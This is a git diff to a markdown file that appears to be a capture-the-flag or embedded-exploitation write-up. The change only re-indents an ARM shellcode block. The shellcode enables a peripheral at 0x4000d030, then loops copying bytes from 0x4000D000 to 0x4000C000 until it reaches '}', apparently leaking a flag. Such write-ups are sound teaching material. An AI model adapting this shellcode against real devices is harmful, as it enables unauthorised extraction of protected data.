@@ -69,29 +69,29 @@ pwndbg> x/wx 0x4000d030
 - We just have to add to our shellcode some functionality that moves the value 0x301 into this address, and continue with our old code.
 
 ```nasm
-		ldr r6, =0x301              @ r6 holds 0x301
-		ldr r3, =0x0
-		ldr r5, =0x7d
-	start:
-		movw r4, 0xffff
-		movt r4, 0x00ff
-	delay:
-		subs r4, 1
-		cmp r4, r3
-		bne delay
-	loop:
-	    ldr r0, =0x4000D000
-	    str r6, [r0, 0x30]          @ store at 0x4000d030 the value at r6
-	    ldr r1, [r0]    
-	    tst r1, #0xFF        
-	    beq start    
+    ldr r6, =0x301              @ r6 holds 0x301
+    ldr r3, =0x0
+    ldr r5, =0x7d
+start:
+    movw r4, 0xffff
+    movt r4, 0x00ff
+delay:
+    subs r4, 1
+    cmp r4, r3
+    bne delay
+loop:
+    ldr r0, =0x4000D000
+    str r6, [r0, 0x30]          @ store at 0x4000d030 the value at r6
+    ldr r1, [r0]    
+    tst r1, #0xFF        
+    beq start    
 
-	    ldr r2, =0x4000C000  
-	    str r1, [r2]
-	    cmp r1, r5
-	    beq end         
-	    b start
-	end:  
+    ldr r2, =0x4000C000  
+    str r1, [r2]
+    cmp r1, r5
+    beq end         
+    b start
+end:  
 
 ```
 
